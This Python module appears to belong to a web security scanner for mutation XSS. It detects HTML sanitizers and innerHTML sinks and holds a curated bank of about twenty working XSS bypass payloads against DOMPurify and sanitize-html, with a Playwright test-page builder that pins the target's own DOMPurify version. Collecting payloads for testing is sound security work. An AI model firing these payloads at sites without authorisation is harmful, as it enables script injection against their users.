"""
_mutation_xss.py
================
Mutation XSS (mXSS) detection.

Background
----------
HTML sanitizers (DOMPurify, sanitize-html, Bleach) parse, clean, and
serialize HTML. The browser then RE-PARSES that serialized output when
it's assigned to innerHTML — and parses it differently than the
sanitizer expected. The result: HTML that was "clean" after sanitization
mutates back into an exploitable form during browser parsing.

Classic mXSS examples
---------------------

  Input:    <a id="x"></a><a id="x" name="y">
  After sanitize: passes (no script, no on*=, etc.)
  After innerHTML re-parse: the second <a> becomes attr of first
  → DOM clobbering primitive

  Input:    <noscript><p title="</noscript><img src=x onerror=alert(1)>">
  After sanitize: depends on parser mode
  Re-parse in different mode: title attr terminates, <img> becomes real

  Input:    <math><mtext><table></mtext><img src=x onerror=alert(1)></table>
  After sanitize: math foreign content rules vary
  Re-parse: <img> escapes the foreign content

  Input:    <svg><p><style><a id="</style><img src=x onerror=alert(1)>"></style>
  Foreign content + raw text element interaction = exploit

The exploit surface
-------------------
Any application that:
  1. Accepts user input
  2. Sanitizes it server-side or client-side
  3. Inserts result via innerHTML

...is potentially vulnerable. DOMPurify is used by ~10M downloads/week,
so finding ONE bypass affects huge fraction of internet.

What this module does
---------------------
- Maintains a CURATED LIBRARY of known mXSS bypass patterns
- For each pattern, knows: source HTML, expected mutation, what to look
  for as proof
- Provides API for headless verification (caller does Playwright)
- Provides static heuristic for "this app likely uses sanitizer + innerHTML"

Public API
----------

    payload_bank() -> List[MutationPayload]
        All known mXSS bypass patterns.

    detect_sanitizer(body) -> Optional[SanitizerInfo]
        Sniff for known sanitizer libraries in response body.

    detect_innerhtml_sinks(body) -> List[str]
        Find places where the page does innerHTML assignment.

    static_assess(body) -> MutationAssessment
        Static analysis: does this page look mXSS-vulnerable?
        (uses sanitizer + innerHTML pattern)
"""

from __future__ import annotations

import re
from dataclasses import dataclass, field
from enum import Enum
from typing import List, Optional, Dict


class Sanitizer(str, Enum):
    DOMPURIFY     = "dompurify"
    SANITIZE_HTML = "sanitize-html"
    DOMPARSER     = "DOMParser"        # raw DOMParser, no actual sanitizing
    JQUERY_HTML   = "jQuery.html"      # jQuery $().html() with .text() escapes
    UNKNOWN       = "unknown"


@dataclass
class SanitizerInfo:
    sanitizer:  Sanitizer
    version:    str = ""
    confidence: float = 0.0
    evidence:   List[str] = field(default_factory=list)


@dataclass
class MutationPayload:
    """One known mXSS bypass."""
    name:           str
    payload:        str            # HTML to send
    target_class:   str            # what category — "namespace", "rawtext", "noscript", etc.
    sanitizer_hits: List[Sanitizer]   # which sanitizers it bypassed in published research
    cve:            str = ""
    description:    str = ""
    sentinel_dom:   str = ""       # selector or substring to verify exec in DOM
    notes:          str = ""
    # v10.82 DEPTH: which DOM sink the live harness must use to verify this payload.
    # Default innerHTML; declarative-shadow-DOM payloads are parser-context only and
    # are INERT under innerHTML, so they must be verified via setHTMLUnsafe.
    required_sink:  str = "innerHTML"


@dataclass
class MutationAssessment:
    """Static signal that page looks mXSS-vulnerable."""
    sanitizer_present:  bool = False
    innerhtml_sinks:    int = 0
    sanitizer_info:     Optional[SanitizerInfo] = None
    risk_score:         float = 0.0    # 0..1
    rationale:          str = ""


# ══════════════════════════════════════════════════════════════════════════════
# SANITIZER DETECTION
# ══════════════════════════════════════════════════════════════════════════════

_SANITIZER_PATTERNS = [
    (Sanitizer.DOMPURIFY, [
        (re.compile(r'\bDOMPurify\.(?:sanitize|version|setConfig)\b'), "DOMPurify API call", 0.95),
        (re.compile(r'purify(?:\.min)?\.js[\?\#"\']', re.I), "DOMPurify script include", 0.85),
        (re.compile(r'\bwindow\.DOMPurify\b'), "DOMPurify global", 0.95),
    ]),
    (Sanitizer.SANITIZE_HTML, [
        (re.compile(r'\bsanitizeHtml\s*\('), "sanitize-html call", 0.9),
        (re.compile(r'sanitize-html(?:\.min)?\.js', re.I), "sanitize-html script", 0.85),
    ]),
    (Sanitizer.JQUERY_HTML, [
        # jQuery $().html() is technically not sanitization, but text/html
        # round-trip via jQuery is a common pattern that mutates.
        (re.compile(r'\$\([^)]+\)\.html\s*\('), "jQuery .html()", 0.6),
    ]),
]


def detect_sanitizer(body: str) -> Optional[SanitizerInfo]:
    """Detect which sanitizer library is loaded. Returns None if none found."""
    if not body:
        return None
    best = None
    best_score = 0.0
    for san, patterns in _SANITIZER_PATTERNS:
        for rx, label, weight in patterns:
            if rx.search(body):
                if weight > best_score:
                    best_score = weight
                    best = SanitizerInfo(sanitizer=san, confidence=weight,
                                         evidence=[label])
    # v10.82 DEPTH: populate the DOMPurify VERSION so the live harness can pin to
    # the deployed version instead of @latest (a real bypass on an old version
    # would otherwise falsely verify as blocked by the newest, patched build).
    if best is not None and best.sanitizer == Sanitizer.DOMPURIFY:
        try:
            from _proto_pollution_analyzer import detect_dompurify_version as _ddv
            _v = _ddv(body)
            if _v and re.match(r"^\d+(?:\.\d+){1,2}$", str(_v).strip()):
                best.version = str(_v).strip()
        except Exception:
            pass
    return best


# ══════════════════════════════════════════════════════════════════════════════
# INNERHTML SINK DETECTION
# ══════════════════════════════════════════════════════════════════════════════

# Patterns that show user-controlled data flows to innerHTML/outerHTML/
# document.write. Heuristic — not a full taint analysis.
_INNERHTML_SINKS = [
    re.compile(r'\.innerHTML\s*=\s*'),
    re.compile(r'\.outerHTML\s*=\s*'),
    re.compile(r'\binsertAdjacentHTML\s*\('),
    re.compile(r'\bdocument\.write(?:ln)?\s*\('),
    re.compile(r'\$\([^)]+\)\.html\s*\('),       # jQuery
    re.compile(r'\bdangerouslySetInnerHTML\b'),  # React
    re.compile(r'\sv-html\s*='),                 # Vue
    re.compile(r'\[innerHTML\]\s*='),            # Angular
    re.compile(r'\sng-bind-html\b'),             # AngularJS
]


def detect_innerhtml_sinks(body: str) -> List[str]:
    """Return list of snippet matches showing innerHTML-style sinks."""
    if not body:
        return []
    found = []
    for rx in _INNERHTML_SINKS:
        for m in rx.finditer(body):
            # Take ~40 chars of context around match
            start = max(0, m.start() - 5)
            end = min(len(body), m.end() + 35)
            snippet = body[start:end].replace("\n", " ")[:80]
            found.append(snippet)
            if len(found) >= 20:   # cap
                break
        if len(found) >= 20:
            break
    return found


def static_assess(body: str) -> MutationAssessment:
    """Static heuristic: does this page have the sanitizer + innerHTML pattern?"""
    if not body:
        return MutationAssessment()

    san = detect_sanitizer(body)
    sinks = detect_innerhtml_sinks(body)

    risk = 0.0
    rationale_parts = []

    if san:
        risk += 0.4
        rationale_parts.append(f"sanitizer:{san.sanitizer.value}")
    if sinks:
        risk += min(0.5, 0.15 * len(sinks))
        rationale_parts.append(f"innerhtml_sinks:{len(sinks)}")

    if san and sinks:
        # Both present — high confidence vector
        risk = min(1.0, risk + 0.2)
        rationale_parts.append("sanitizer+innerhtml pattern matches mXSS profile")

    return MutationAssessment(
        sanitizer_present=san is not None,
        innerhtml_sinks=len(sinks),
        sanitizer_info=san,
        risk_score=risk,
        rationale="; ".join(rationale_parts) or "no_mxss_indicators",
    )


# ══════════════════════════════════════════════════════════════════════════════
# MUTATION PAYLOAD LIBRARY
# ══════════════════════════════════════════════════════════════════════════════
#
# Curated from public research:
# - Mario Heiderich's "mXSS Cheat Sheet" (cure53)
# - DOMPurify CHANGELOG (each version = new bypass found)
# - HackerOne disclosed bypasses
#
# Each payload includes a sentinel: a substring or DOM selector that
# proves the mutation worked. Caller uses Playwright to verify.

_MUTATION_PAYLOADS: List[MutationPayload] = [
    # ── Foreign content namespace bypasses ────────────────────────────────
    MutationPayload(
        name="svg_p_style_namespace_break",
        payload='<svg><p><style><a id="</style><img src=x onerror=alert(1)>"></style></p></svg>',
        target_class="namespace_foreign_content",
        sanitizer_hits=[Sanitizer.DOMPURIFY],
        cve="DOMPurify <2.0.17",
        description=("SVG → P → STYLE foreign content interaction. Style raw "
                     "text terminates differently across parsers; <img> "
                     "escapes the foreign content boundary."),
        sentinel_dom='img[src="x"][onerror]',
    ),
    MutationPayload(
        name="math_mtext_table_escape",
        payload='<math><mtext><table></mtext><img src=x onerror=alert(1)></table></math>',
        target_class="namespace_foreign_content",
        sanitizer_hits=[Sanitizer.DOMPURIFY],
        description=("MathML foreign content + table elements: parser "
                     "switches namespace at <table>, sanitizer doesn't "
                     "track that the <img> is now in HTML namespace."),
        sentinel_dom='img[onerror]',
    ),
    MutationPayload(
        name="svg_foreignObject_break",
        payload='<svg><foreignObject><math><a><div><iframe srcdoc="<img src=x onerror=alert(1)>">',
        target_class="namespace_foreign_content",
        sanitizer_hits=[Sanitizer.DOMPURIFY],
        description="foreignObject reverts to HTML namespace — iframe srcdoc rendered fresh.",
        sentinel_dom='iframe[srcdoc]',
    ),

    # ── noscript content gymnastics ─────────────────────────────────────
    MutationPayload(
        name="noscript_title_terminator",
        payload='<noscript><p title="</noscript><img src=x onerror=alert(1)>"></p>',
        target_class="rawtext_noscript",
        sanitizer_hits=[Sanitizer.DOMPURIFY],
        description=("noscript content treated as raw text when scripting "
                     "disabled (sanitizer parser), but as elements when "
                     "scripting enabled (browser). Title attr terminator "
                     "moves the boundary."),
        sentinel_dom='img[onerror]',
    ),
    MutationPayload(
        name="noscript_textarea_break",
        payload='<noscript><textarea></noscript><img src=x onerror=alert(1)>',
        target_class="rawtext_noscript",
        sanitizer_hits=[Sanitizer.DOMPURIFY],
        description="noscript+textarea: when re-parsed with scripting on, textarea closes early.",
        sentinel_dom='img[onerror]',
    ),

    # ── Style/script raw text element interactions ──────────────────────
    MutationPayload(
        name="style_inside_select_textarea",
        payload='<select><textarea></select><style><img src=x onerror=alert(1)></style>',
        target_class="rawtext_select_textarea",
        sanitizer_hits=[Sanitizer.DOMPURIFY, Sanitizer.SANITIZE_HTML],
        description="Select+textarea content model collision; style inside re-parses as element.",
        sentinel_dom='img[onerror]',
    ),
    MutationPayload(
        name="title_with_xmp_break",
        payload='<title><xmp></title><img src=x onerror=alert(1)></xmp>',
        target_class="rawtext_title",
        sanitizer_hits=[Sanitizer.DOMPURIFY],
        description="title + xmp raw text element; browser closes title at </title>, xmp activates.",
        sentinel_dom='img[onerror]',
    ),

    # ── Comment / CDATA boundary tricks ────────────────────────────────
    MutationPayload(
        name="comment_unbalanced_dash",
        payload='<!--><img src=x onerror=alert(1)>-->',
        target_class="comment_boundary",
        sanitizer_hits=[Sanitizer.SANITIZE_HTML],
        description=("HTML comment terminator parsing varies — some "
                     "sanitizers treat as comment, browser doesn't."),
        sentinel_dom='img[onerror]',
    ),
    MutationPayload(
        name="cdata_in_html_namespace",
        payload='<![CDATA[<img src=x onerror=alert(1)>]]>',
        target_class="comment_boundary",
        sanitizer_hits=[Sanitizer.DOMPURIFY],
        description="CDATA only valid in foreign content; HTML treats as bogus comment.",
        sentinel_dom='img[onerror]',
    ),

    # ── Form-related mXSS ──────────────────────────────────────────────
    MutationPayload(
        name="form_inside_form",
        payload='<form><div><form><button formaction="javascript:alert(1)">x</button>',
        target_class="form_nesting",
        sanitizer_hits=[Sanitizer.DOMPURIFY],
        description="Nested forms — second form's button gets re-associated to first form during parsing.",
        sentinel_dom='button[formaction]',
    ),

    # ── Template element shenanigans ───────────────────────────────────
    MutationPayload(
        name="template_content_escape",
        payload='<template><script>alert(1)</script></template>',
        target_class="template_element",
        sanitizer_hits=[Sanitizer.SANITIZE_HTML],
        description=("template element creates document fragment; some "
                     "sanitizers don't recurse into .content."),
        sentinel_dom='template > script',
    ),

    # ── Attribute name mutations ────────────────────────────────────────
    MutationPayload(
        name="img_dynsrc_legacy",
        payload='<img dynsrc="javascript:alert(1)" />',
        target_class="legacy_attribute",
        sanitizer_hits=[Sanitizer.SANITIZE_HTML],
        description="Legacy IE attributes still parsed by some sanitizers as 'safe'.",
        sentinel_dom='img[dynsrc]',
    ),

    # ── DOMPurify-specific recent bypasses ─────────────────────────────
    MutationPayload(
        name="dompurify_2.0.17_namespace",
        payload='<form id=x><input id=tagName value="form"><input id=parent value="textContent"></form><img src=x onerror=alert(1)>',
        target_class="dompurify_specific",
        sanitizer_hits=[Sanitizer.DOMPURIFY],
        cve="DOMPurify <=2.0.17",
        description="DOM clobbering primitives that confuse DOMPurify config lookup.",
        sentinel_dom='img[onerror]',
    ),

    # ── XML namespace tricks ───────────────────────────────────────────
    MutationPayload(
        name="xml_namespace_a",
        payload='<a xmlns="urn:foo"><a><a><a><script>alert(1)</script>',
        target_class="namespace_xml",
        sanitizer_hits=[Sanitizer.DOMPURIFY],
        description="Custom XML namespace can confuse DOMPurify element checking.",
        sentinel_dom='script',
    ),

    # ── Declarative Shadow DOM smuggling (Baseline 2024) ──────────────────
    # <template shadowrootmode="open"> is instantiated ONLY by the HTML parser
    # (initial page parse or setHTMLUnsafe), NOT by plain innerHTML — that gap
    # IS the bypass. A server-side sanitizer that predates declarative shadow
    # DOM sees an inert <template> and passes its content through; when the
    # output later reaches a parser sink the browser builds a real OPEN shadow
    # root and renders the smuggled markup.
    #   IMPORTANT: the shadow attaches to the template's PARENT ELEMENT. In a
    #   setHTMLUnsafe(fragment) call a top-level template's parent is a
    #   DocumentFragment (not an element) → it does NOT attach; so each payload
    #   wraps the template in an explicit host element, which fires under BOTH
    #   setHTMLUnsafe and full-page parse. Verify via build_test_page(...,
    #   insert="setHTMLUnsafe"); under plain innerHTML these correctly do NOT
    #   fire. Rendered content lands in an OPEN shadow root → confirm with the
    #   deep query / shadowRoot.innerHTML runtime hook.
    MutationPayload(
        name="declarative_shadow_dom_basic",
        payload='<div><template shadowrootmode="open"><img src=x onerror=alert(1)></template></div>',
        target_class="declarative_shadow_dom",
        sanitizer_hits=[Sanitizer.DOMPURIFY],
        description=("Declarative Shadow DOM: sanitizers unaware of shadowrootmode "
                     "treat <template> content as inert, but a parser sink "
                     "(setHTMLUnsafe / initial parse) attaches a real open shadow "
                     "root to the host <div> and renders the <img> → onerror fires."),
        sentinel_dom='img[onerror]',
        notes="parser-context sink only (setHTMLUnsafe / full parse); inert under innerHTML",
        required_sink="setHTMLUnsafe",
    ),
    MutationPayload(
        name="declarative_shadow_dom_nested",
        payload=('<div><section><template shadowrootmode="open">'
                 '<img src=x onerror=alert(1)></template></section></div>'),
        target_class="declarative_shadow_dom",
        sanitizer_hits=[Sanitizer.DOMPURIFY],
        description=("Same smuggling nested under benign container tags so allowlist "
                     "sanitizers that permit div/section pass the whole subtree; the "
                     "shadowrootmode template still attaches to <section> on parse."),
        sentinel_dom='img[onerror]',
        notes="parser-context sink only; inert under innerHTML",
        required_sink="setHTMLUnsafe",
    ),
    MutationPayload(
        name="declarative_shadow_dom_svg_combo",
        payload=('<div><template shadowrootmode="open"><svg><style></style>'
                 '<img src=x onerror=alert(1)></svg></template></div>'),
        target_class="declarative_shadow_dom",
        sanitizer_hits=[Sanitizer.DOMPURIFY],
        description=("Declarative shadow root carrying a foreign-content (SVG/style) "
                     "mXSS payload — combines shadowrootmode smuggling with an SVG "
                     "namespace break inside the shadow tree."),
        sentinel_dom='img[onerror]',
        notes="parser-context sink only; inert under innerHTML",
        required_sink="setHTMLUnsafe",
    ),

    # ── Rawtext-element ATTRIBUTE breakout (v10.82) ───────────────────────
    # A </tag> inside an ATTRIBUTE VALUE of a rawtext element closes the element
    # early during re-parse, dropping the following markup into HTML context. The
    # sanitizer, parsing the rawtext body as opaque text, doesn't see the escape.
    # Mirrors the DOMPurify CVE-feed PoCs (CVE-2025-15599 etc.).
    MutationPayload(
        name="textarea_title_attr_breakout",
        payload='<textarea><x title="</textarea><img src=x onerror=alert(1)>">',
        target_class="rawtext_attribute_breakout",
        sanitizer_hits=[Sanitizer.DOMPURIFY],
        cve="CVE-2025-15599",
        description=("</textarea> inside an attribute value re-closes the rawtext "
                     "element on re-parse; the trailing <img> lands in HTML context."),
        sentinel_dom='img[onerror]',
    ),
    MutationPayload(
        name="noscript_title_attr_breakout",
        payload='<noscript><x title="</noscript><img src=x onerror=alert(1)>">',
        target_class="rawtext_attribute_breakout",
        sanitizer_hits=[Sanitizer.DOMPURIFY],
        cve="CVE-2026-0540",
        description=("noscript is rawtext when scripting is enabled (browser) but "
                     "elements when disabled (sanitizer) — attr-value </noscript> "
                     "escapes on the browser side."),
        sentinel_dom='img[onerror]',
    ),
    MutationPayload(
        name="iframe_title_attr_breakout",
        payload='<iframe><x title="</iframe><img src=x onerror=alert(1)>">',
        target_class="rawtext_attribute_breakout",
        sanitizer_hits=[Sanitizer.DOMPURIFY],
        description="</iframe> inside an attribute value re-closes the rawtext iframe.",
        sentinel_dom='img[onerror]',
    ),
    MutationPayload(
        name="noembed_title_attr_breakout",
        payload='<noembed><x title="</noembed><img src=x onerror=alert(1)>">',
        target_class="rawtext_attribute_breakout",
        sanitizer_hits=[Sanitizer.DOMPURIFY],
        description="</noembed> rawtext attribute-value breakout.",
        sentinel_dom='img[onerror]',
    ),

    # ── MathML mglyph/malignmark integration-point confusion (v10.82) ─────
    # <mglyph>/<malignmark> are MathML text integration points: their content is
    # parsed as HTML, so a <style>/<img> inside flips namespace and executes.
    # Prior MathML coverage was only mtext+table.
    MutationPayload(
        name="mathml_mglyph_style_break",
        payload='<math><mtext><mglyph><style><img src=x onerror=alert(1)></style></mglyph></mtext></math>',
        target_class="namespace_foreign_content",
        sanitizer_hits=[Sanitizer.DOMPURIFY],
        description=("MathML <mglyph> is an HTML integration point; nested "
                     "<style><img> flips namespace so the <img> parses as HTML."),
        sentinel_dom='img[onerror]',
    ),
]


def payload_bank() -> List[MutationPayload]:
    """Return all known mXSS bypass payloads."""
    return list(_MUTATION_PAYLOADS)


def payloads_for_sanitizer(sanitizer: Sanitizer) -> List[MutationPayload]:
    """Return payloads known to bypass a specific sanitizer."""
    return [p for p in _MUTATION_PAYLOADS if sanitizer in p.sanitizer_hits]


def payloads_by_class(target_class: str) -> List[MutationPayload]:
    """Return payloads in a specific category."""
    return [p for p in _MUTATION_PAYLOADS if p.target_class == target_class]


# ══════════════════════════════════════════════════════════════════════════════
# PLAYWRIGHT INTEGRATION HELPERS (callable from caller's headless code)
# ══════════════════════════════════════════════════════════════════════════════

def build_test_page(payload: str, sanitizer: Sanitizer = Sanitizer.DOMPURIFY,
                    insert: str = "innerHTML", version: str = "") -> str:
    """Build a self-contained HTML test page that:
      1. Loads the named sanitizer
      2. Sanitizes the payload
      3. Assigns result to the chosen parser sink
      4. Reports back via window.__mXSS_RESULT__

    `insert` selects the DOM sink the sanitized string flows into:
      - "innerHTML"     (default) — plain innerHTML; does NOT instantiate
                        <template shadowrootmode> (that gap is a real bypass).
      - "setHTMLUnsafe" — parser sink that DOES instantiate declarative shadow
                        DOM; required to verify declarative_shadow_dom payloads.
                        Falls back to innerHTML if the browser lacks the API.

    Caller spawns this in Playwright, waits for window.__mXSS_RESULT__,
    and checks if a dialog fired or sentinel selector matched.
    """
    if insert == "setHTMLUnsafe":
        insert_stmt = ("if (t.setHTMLUnsafe) { t.setHTMLUnsafe(clean); } "
                       "else { t.innerHTML = clean; window.__mXSS_RESULT__.warning "
                       "= 'setHTMLUnsafe unsupported, fell back to innerHTML'; }")
    else:
        insert_stmt = "t.innerHTML = clean;"
    # v10.82 DEPTH: pin the DOMPurify harness to the target's DETECTED version, not
    # @latest — @latest is patched, so a real bypass on the deployed (older) version
    # would falsely verify as blocked. Only pin on a clean semver; else @latest.
    _dp_ver = str(version).strip() if version else ""
    if _dp_ver and not re.match(r"^\d+(?:\.\d+){1,2}$", _dp_ver):
        _dp_ver = ""
    _dp_cdn = ("https://cdn.jsdelivr.net/npm/dompurify@%s/dist/purify.min.js" % _dp_ver
               if _dp_ver else
               "https://cdn.jsdelivr.net/npm/dompurify@latest/dist/purify.min.js")
    sanitizer_cdn = {
        Sanitizer.DOMPURIFY: _dp_cdn,
        Sanitizer.SANITIZE_HTML: "",   # node-only, no CDN
        Sanitizer.JQUERY_HTML: "https://code.jquery.com/jquery-3.7.0.min.js",
    }.get(sanitizer, "")

    # Use string formatting (not f-string) to avoid escaping JS braces.
    # Inject payload as JSON-encoded string for safe transport into JS.
    import json
    payload_json = json.dumps(payload)

    template = """<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>mXSS test</title></head>
<body>
<div id="target"></div>
<script src="__SAN_CDN__"></script>
<script>
window.__mXSS_RESULT__ = { dialog_fired: false, html_after: "", error: null };
// Hook alert/confirm/prompt to detect exec
['alert','confirm','prompt'].forEach(function(fn) {
    var orig = window[fn];
    window[fn] = function(msg) {
        window.__mXSS_RESULT__.dialog_fired = true;
        window.__mXSS_RESULT__.dialog_message = String(msg);
        return orig ? orig.call(window, msg) : undefined;
    };
});
try {
    var raw = __PAYLOAD_JSON__;
    var clean;
    if (typeof DOMPurify !== "undefined") {
        clean = DOMPurify.sanitize(raw);
    } else if (typeof jQuery !== "undefined") {
        // jQuery .html() round-trip — not actually sanitization but mutates
        clean = jQuery("<div>").html(raw).html();
    } else {
        clean = raw;   // fallback: no sanitization
        window.__mXSS_RESULT__.warning = "no sanitizer loaded";
    }
    var t = document.getElementById("target");
    __INSERT_STMT__
    window.__mXSS_RESULT__.html_after = t.innerHTML;
} catch (e) {
    window.__mXSS_RESULT__.error = String(e);
}
</script>
</body></html>"""

    return (template
            .replace("__SAN_CDN__", sanitizer_cdn)
            .replace("__INSERT_STMT__", insert_stmt)
            .replace("__PAYLOAD_JSON__", payload_json))
